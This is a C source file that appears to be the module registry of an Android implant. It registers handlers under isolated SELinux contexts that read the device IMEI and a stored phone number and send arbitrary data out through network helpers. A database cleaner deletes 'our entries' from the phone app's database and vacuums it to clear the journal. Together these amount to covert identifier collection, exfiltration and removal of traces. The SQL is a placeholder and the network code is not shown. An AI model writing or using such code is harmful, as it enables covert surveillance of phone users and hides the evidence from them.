#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "modules.h"
#include "ipc.h"
#include "symbol_resolver.h"
#include "network_utils.h"
#include "xml_utils.h"

static const char *db_path = "/data/data/com.android.phone/databases/test.db";

static const module_config_t MODULE_REGISTRY[] = {
    { MOD_ID_IMEI,       "IMEI",      1001, 1001, "u:r:isolated_imei:s0", mod_imei       },
    { MOD_ID_PHONE,      "Phone",     1002, 1002, "u:r:isolated_app:s0",  mod_phone      },
    { MOD_ID_LOGGER,     "Logger",    1004, 1004, "u:r:isolated_net:s0",  mod_logger     },
    { MOD_ID_SENDER,     "Sender",    1004, 1004, "u:r:isolated_net:s0",  mod_sender     },
    { MOD_ID_DB_CLEANER, "DBCleaner", 1001, 1001, "u:r:isolated_app:s0",  mod_db_cleaner }, 
};


/*  */
static void mod_imei(int fd, const char* arg)
{
    UNUSED(arg);
    char val[256] = { 0 };
    ProjectStatus status = 0;
    ipc_response_t resp = { 0 };

    status = sal_get_property("ro.id.imei", val);
    if (status == STATUS_SUCCESS) {
        ipc_set_data(&resp, val);
    }
    else {
        ipc_set_error(&resp, status, NULL);
    }

    if (ipc_send_packet(fd, &resp) != STATUS_SUCCESS) {
        ERROR("[IMEI] Failed to send IPC response to manager");
    }
}

/*  */
static void mod_phone(int fd, const char* arg)
{
    UNUSED(arg);
    char val[256] = { 0 };
    ProjectStatus status = 0;
    ipc_response_t resp = { 0 };

    status = xml_get_value("/data/local/tmp/prefs.xml", "number", val, sizeof(val));
    if (status == STATUS_SUCCESS) {
        ipc_set_data(&resp, val);
    } else {
        ipc_set_error(&resp, status, NULL);
    }

    if (ipc_send_packet(fd, &resp) != STATUS_SUCCESS) {
        ERROR("[PHONE] Failed to send IPC response to manager");
    }
}

/*  */
static void mod_logger(int fd, const char* arg)
{
    UNUSED(fd);
    ipc_response_t resp = { 0 };

    if (arg != NULL) {
        network_send_log(arg);
        ipc_set_data(&resp, "Success");
    } else {
        ipc_set_error(&resp, STATUS_ERR_INVALID_ARG, NULL);
    }

    if (ipc_send_packet(fd, &resp) != STATUS_SUCCESS) {
        ERROR("[LOGGER] Failed to send IPC response to manager");
    }
}

/*  */
static void mod_sender(int fd, const char* arg)
{
    ipc_response_t resp = { 0 };
    char server_response[128] = { 0 };

    if (arg != NULL) {
        if (network_send_payload(arg, server_response, sizeof(server_response)) == STATUS_SUCCESS) {
            ipc_set_data(&resp, server_response);
        } else {
            ipc_set_error(&resp, STATUS_ERR_NETWORK_FAILURE, NULL);
        }
    } else {
        ipc_set_error(&resp, STATUS_ERR_INVALID_ARG, NULL);
    }

    if (ipc_send_packet(fd, &resp) != STATUS_SUCCESS) {
        ERROR("[SENDER] Failed to send IPC response to manager");
    }
}

/*  */
static void mod_db_cleaner(int fd, const char* arg)
{
    UNUSED(arg);
    int rc = 0;
    char* err_msg = NULL;
    struct sqlite3* db = NULL;
    ipc_response_t resp = { 0 };
    ProjectStatus status = STATUS_SUCCESS;

    /* Open the DB file */
    if (sal_sqlite_open(db_path, &db) != SQLITE_OK) {
        if (db != NULL) {
            sal_sqlite_close(db);
            db = NULL;
        }
        status = STATUS_ERR_DB_LOAD;
        goto cleanup;
    }

    /* Start the transaction to delete our entries */
    const char* txn_sql = 
        "BEGIN IMMEDIATE;" \
        "DELETE FROM ... WHERE ...='...';" \
        "COMMIT;";

    rc = sal_sqlite_exec(db, txn_sql, &err_msg);
    if (rc != SQLITE_OK) {
        if (err_msg != NULL) {
            sal_sqlite_free(err_msg);
        }
        if (db != NULL) {
            sal_sqlite_close(db);
            db = NULL;
        }
        status = STATUS_ERR_DB_EXEC;
        goto cleanup;
    }

    /* Call VACUUM in order to reduce DB size + clear journal */
    rc = sal_sqlite_exec(db, "VACUUM;", &err_msg);
    if (rc != SQLITE_OK) {
        if (err_msg != NULL) {
            sal_sqlite_free(err_msg);
        }
        if (db != NULL) {
            sal_sqlite_close(db);
            db = NULL;
        }
        status = STATUS_ERR_DB_EXEC;
        goto cleanup;
    }

cleanup:
    if (status == STATUS_SUCCESS) {
        ipc_set_data(&resp, NULL);
    }
    else {
        ipc_set_error(&resp, status, NULL); 
    }

    if (ipc_send_packet(fd, &resp) != STATUS_SUCCESS) {
        ERROR("[DB] Failed to send IPC response to manager");
    }
}

/*  */
const module_config_t* get_module_config(int module_id) {
    size_t count = sizeof(MODULE_REGISTRY) / sizeof(module_config_t);  // TODO: Convert to compile-time macro
    for (size_t i = 0; i < count; i++) {
        if (MODULE_REGISTRY[i].id == module_id) {
            return &MODULE_REGISTRY[i];
        }
    }
    return NULL;
}